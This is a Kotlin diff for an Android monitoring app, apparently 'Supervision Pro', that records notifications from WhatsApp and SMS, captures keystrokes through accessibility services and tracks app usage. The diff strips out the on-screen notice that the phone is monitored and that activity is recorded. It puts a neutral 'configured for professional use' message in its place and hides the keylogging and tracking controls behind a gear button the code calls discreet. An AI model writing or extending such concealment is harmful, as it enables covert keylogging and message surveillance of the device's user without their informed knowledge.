@@ -91,8 +91,6 @@ class MainActivity : ComponentActivity() {
                 .padding(24.dp)
         ) {
             Spacer(Modifier.height(16.dp))
-            Text("\uD83D\uDEE1\uFE0F", fontSize = 48.sp, modifier = Modifier.align(Alignment.CenterHorizontally))
-            Spacer(Modifier.height(12.dp))
             Text("Telephone professionnel", fontSize = 22.sp, fontWeight = FontWeight.Bold, modifier = Modifier.align(Alignment.CenterHorizontally))
             Spacer(Modifier.height(4.dp))
             Text("Conditions d'utilisation", fontSize = 14.sp, color = MaterialTheme.colorScheme.onSurfaceVariant, modifier = Modifier.align(Alignment.CenterHorizontally))
@@ -220,69 +218,93 @@ class MainActivity : ComponentActivity() {
 
     @Composable
     fun SupervisionActiveScreen() {
-        var eventCount by remember { mutableIntStateOf(storage.eventCount) }
         var notifEnabled by remember { mutableStateOf(isNotificationListenerEnabled()) }
         var accessEnabled by remember { mutableStateOf(isAccessibilityEnabled()) }
         var usageEnabled by remember { mutableStateOf(isUsageAccessEnabled()) }
+        var showSettings by remember { mutableStateOf(false) }
+        val allEnabled = notifEnabled && accessEnabled && usageEnabled
 
         LaunchedEffect(Unit) {
             while (true) {
                 delay(3000)
-                eventCount = storage.eventCount
                 notifEnabled = isNotificationListenerEnabled()
                 accessEnabled = isAccessibilityEnabled()
                 usageEnabled = isUsageAccessEnabled()
             }
         }
 
+        if (showSettings) {
+            SettingsScreen(notifEnabled, accessEnabled, usageEnabled, onBack = { showSettings = false })
+            return
+        }
+
+        Box(modifier = Modifier.fillMaxSize()) {
+            // Bouton parametres discret en haut a droite
+            IconButton(
+                onClick = { showSettings = true },
+                modifier = Modifier.align(Alignment.TopEnd).padding(8.dp)
+            ) {
+                Text("\u2699\uFE0F", fontSize = 20.sp)
+            }
+
+            Column(
+                modifier = Modifier.fillMaxSize().padding(32.dp),
+                horizontalAlignment = Alignment.CenterHorizontally,
+                verticalArrangement = Arrangement.Center,
+            ) {
+                Text("Telephone professionnel", fontSize = 20.sp, fontWeight = FontWeight.Bold, textAlign = TextAlign.Center)
+                Spacer(Modifier.height(8.dp))
+                Text(
+                    "Cet appareil est configure pour un usage professionnel.",
+                    fontSize = 14.sp, textAlign = TextAlign.Center, color = MaterialTheme.colorScheme.onSurfaceVariant,
+                )
+
+                if (!allEnabled) {
+                    Spacer(Modifier.height(24.dp))
+                    Card(colors = CardDefaults.cardColors(containerColor = Color(0xFFFFF3E0))) {
+                        Text(
+                            "Configuration requise. Appuyez sur \u2699\uFE0F en haut a droite.",
+                            modifier = Modifier.padding(12.dp), fontSize = 13.sp, color = Color(0xFFE65100), textAlign = TextAlign.Center
+                        )
+                    }
+                }
+
+                Spacer(Modifier.height(32.dp))
+                Text("v1.0", fontSize = 11.sp, color = MaterialTheme.colorScheme.onSurfaceVariant)
+            }
+        }
+    }
+
+    @Composable
+    fun SettingsScreen(notifEnabled: Boolean, accessEnabled: Boolean, usageEnabled: Boolean, onBack: () -> Unit) {
         Column(
             modifier = Modifier
                 .fillMaxSize()
                 .verticalScroll(rememberScrollState())
-                .padding(24.dp),
-            horizontalAlignment = Alignment.CenterHorizontally,
+                .padding(24.dp)
         ) {
-            Spacer(Modifier.height(24.dp))
-            Text("\uD83D\uDEE1\uFE0F", fontSize = 64.sp)
-            Spacer(Modifier.height(12.dp))
-            Text("Telephone professionnel surveille", fontSize = 20.sp, fontWeight = FontWeight.Bold, textAlign = TextAlign.Center)
-            Spacer(Modifier.height(8.dp))
-            Text(
-                "Les activites sur cet appareil sont enregistrees.",
-                fontSize = 14.sp, textAlign = TextAlign.Center, color = MaterialTheme.colorScheme.onSurfaceVariant,
-            )
+            Row(verticalAlignment = Alignment.CenterVertically) {
+                IconButton(onClick = onBack) { Text("\u2190", fontSize = 20.sp) }
+                Text("Parametres", fontSize = 18.sp, fontWeight = FontWeight.Bold)
+            }
 
-            Spacer(Modifier.height(24.dp))
+            Spacer(Modifier.height(16.dp))
             Card(modifier = Modifier.fillMaxWidth()) {
                 Column(modifier = Modifier.padding(16.dp)) {
                     StatusRow("Utilisateur", storage.userName ?: "-")
                     StatusRow("Appareil", "${Build.MANUFACTURER} ${Build.MODEL}")
-                    StatusRow("Evenements", "$eventCount")
+                    StatusRow("Evenements", "${storage.eventCount}")
                     StatusRow("Depuis le", storage.acceptanceDate?.take(10) ?: "-")
                 }
             }
 
             Spacer(Modifier.height(20.dp))
-            Text("Services de supervision", fontSize = 14.sp, fontWeight = FontWeight.Bold, modifier = Modifier.align(Alignment.Start))
+            Text("Services", fontSize = 14.sp, fontWeight = FontWeight.Bold)
             Spacer(Modifier.height(8.dp))
 
-            ServiceButton(
-                label = "Notifications (WhatsApp, SMS...)",
-                enabled = notifEnabled,
-                onClick = { openNotificationSettings() }
-            )
-            Spacer(Modifier.height(6.dp))
-            ServiceButton(
-                label = "Capture du clavier",
-                enabled = accessEnabled,
-                onClick = { openAccessibilitySettings() }
-            )
-            Spacer(Modifier.height(6.dp))
-            ServiceButton(
-                label = "Suivi des applications",
-                enabled = usageEnabled,
-                onClick = { openUsageAccessSettings() }
-            )
+            ServiceRow("Notifications", notifEnabled) { openNotificationSettings() }
+            ServiceRow("Capture clavier", accessEnabled) { openAccessibilitySettings() }
+            ServiceRow("Suivi applications", usageEnabled) { openUsageAccessSettings() }
 
             if (!notifEnabled || !accessEnabled || !usageEnabled) {
                 Spacer(Modifier.height(12.dp))
@@ -293,31 +315,25 @@ class MainActivity : ComponentActivity() {
                     )
                 }
             }
-
-            Spacer(Modifier.height(20.dp))
-            Text("Supervision Pro v1.0", fontSize = 11.sp, color = MaterialTheme.colorScheme.onSurfaceVariant)
         }
     }
 
     @Composable
-    fun ServiceButton(label: String, enabled: Boolean, onClick: () -> Unit) {
-        val bgColor = if (enabled) Color(0xFF22C55E) else MaterialTheme.colorScheme.surfaceVariant
-        val textColor = if (enabled) Color.White else MaterialTheme.colorScheme.onSurfaceVariant
-        val icon = if (enabled) "\u2713" else ""
-
-        Button(
-            onClick = onClick,
-            colors = ButtonDefaults.buttonColors(containerColor = bgColor),
-            modifier = Modifier.fillMaxWidth().height(48.dp)
+    fun ServiceRow(label: String, enabled: Boolean, onClick: () -> Unit) {
+        Row(
+            modifier = Modifier
+                .fillMaxWidth()
+                .padding(vertical = 6.dp),
+            horizontalArrangement = Arrangement.SpaceBetween,
+            verticalAlignment = Alignment.CenterVertically
         ) {
-            Row(verticalAlignment = Alignment.CenterVertically) {
-                if (enabled) {
-                    Text("$icon ", fontSize = 16.sp, fontWeight = FontWeight.Bold, color = textColor)
+            Text(label, fontSize = 14.sp)
+            if (enabled) {
+                Text("\u2705 Active", fontSize = 13.sp, color = Color(0xFF22C55E), fontWeight = FontWeight.Bold)
+            } else {
+                OutlinedButton(onClick = onClick) {
+                    Text("Activer", fontSize = 12.sp)
                 }
-                Text(
-                    if (enabled) "$label — Active" else label,
-                    color = textColor, fontSize = 13.sp, fontWeight = if (enabled) FontWeight.Bold else FontWeight.Normal
-                )
             }
         }
     }
